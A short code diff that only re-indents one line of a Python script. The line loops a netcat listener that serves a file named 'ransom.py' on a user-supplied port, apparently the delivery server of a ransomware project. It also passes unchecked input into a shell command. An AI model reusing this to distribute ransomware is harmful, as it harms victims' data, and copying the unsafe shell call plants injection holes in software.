@@ -6,4 +6,4 @@ import subprocess
 port = sys.argv[1]
 
 while True:
-  subprocess.call("netcat -q 0 -l -p " + port + " < ransom.py", shell = True)
+    subprocess.call("netcat -q 0 -l -p " + port + " < ransom.py", shell = True)
